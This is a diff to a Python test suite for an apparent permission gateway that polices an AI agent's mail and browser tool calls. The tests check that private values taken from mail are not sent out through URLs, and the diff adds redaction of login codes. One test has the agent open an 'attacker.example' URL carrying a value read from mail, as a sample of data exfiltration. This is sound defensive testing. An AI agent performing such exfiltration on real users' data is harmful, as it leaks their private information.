@@ -256,7 +256,7 @@ class FakeBrowser:
 def _browser_grant(daemon: RunningDaemon, family: Family, words: str, extra: list[FakeCap]) -> tuple[Any, FakeBrowser]:
     fb = FakeBrowser()
     caps: list[Any] = [BrowserOpen(fb, family), BrowserNavigate(fb, family)] + extra   # type: ignore[arg-type]
-    grant, _ = gateway_setup(daemon, {family.read, "probe"}, gateway_request(words), caps)
+    grant, _ = gateway_setup(daemon, {family.read, "probe"}, gateway_request(words), caps, identity=family.identity)
     return grant, fb
 
 
@@ -308,9 +308,9 @@ def test_laundering_and_owner_data_sinks(daemon: RunningDaemon) -> None:   # ite
     assert len(asked) == 2 and all(V in q for q in asked)  # the bank value asks even though it was echoed on a page
 
 
-def test_a_code_from_mail_asks(daemon: RunningDaemon) -> None:   # item 10 (N1b)
+def test_a_private_reference_from_mail_asks(daemon: RunningDaemon) -> None:   # item 10 (N1b)
     code = FakeCap("probe.mail", "read", {"probe"}, reads=(("owner_account", "mail"), ("email", "m1")),
-                   content={"text": "Your login code is 448213xx"})      # Mail read: labelled both -> private
+                   content={"text": "Your invoice reference is 448213xx"})  # private text, not a redacted secret
     web = FakeCap("probe.web", "read", {"probe"}, reads=(("web", "https://kartikey.xyz/p"),), content={"text": "hi"})
     grant, fb = _browser_grant(daemon, FERB_BROWSER, "read my mail", [code, web])
     gateway_tool_call(daemon, grant, "probe.mail"); gateway_tool_call(daemon, grant, "probe.web")
@@ -318,6 +318,14 @@ def test_a_code_from_mail_asks(daemon: RunningDaemon) -> None:   # item 10 (N1b)
     r = gateway_tool_call(daemon, grant, "ferb_browser.open", url="https://attacker.example/?c=448213xx")
     owner.stop()
     assert r["is_error"] and "448213xx" in _asked(daemon)[0]["question"]
+
+
+def test_a_login_code_from_mail_is_redacted_before_a_worker_can_copy_it(daemon: RunningDaemon) -> None:
+    code = FakeCap("probe.mail", "read", {"probe"}, reads=(("owner_account", "mail"), ("email", "m1")),
+                   content={"text": "Your login code is 448213"})
+    grant, _ = _browser_grant(daemon, FERB_BROWSER, "read my mail", [code])
+    result = gateway_tool_call(daemon, grant, "probe.mail")
+    assert not result["is_error"] and "448213" not in str(result) and "[redacted]" in str(result)
 
 
 def test_a_public_value_and_a_followed_link_do_not_ask(daemon: RunningDaemon) -> None:   # item 10 benign
@@ -365,7 +373,7 @@ def test_a_tree_no_stays_final_after_another_tree_makes_the_host_known(
         owner.stop()
     assert first["is_error"] and first_browser.calls == 0
 
-    allowed = grant_task(daemon, "allowed", Identity.OWNER, {family.read, "probe"}, "summarize another report")
+    allowed = grant_task(daemon, "allowed", family.identity, {family.read, "probe"}, "summarize another report")
     _trifecta(daemon, allowed)
     owner = Answers(daemon, granted=True, choice=1)
     try:
@@ -576,7 +584,8 @@ def test_owner_url_hosts_are_not_lowercased_before_uts46_mapping() -> None:
     """UTS46 maps capital sigma to σ; Python lower() contextually changes the last one to ς. Naming one host must
     not authorize the other, whether from a request, an answer, or argument provenance."""
     from ferb.policy import urls
-    url = "https://ΣΟΦΙΑΣ.example/"
+    # The hyphen ends the cased word; a dot followed by a letter is case-ignorable for Python's final-sigma rule.
+    url = "https://ΣΟΦΙΑΣ-1.example/"
     parsed = urls.parse(url)
     assert parsed is not None
     assert parsed.host != provenance.host_of(url.lower())
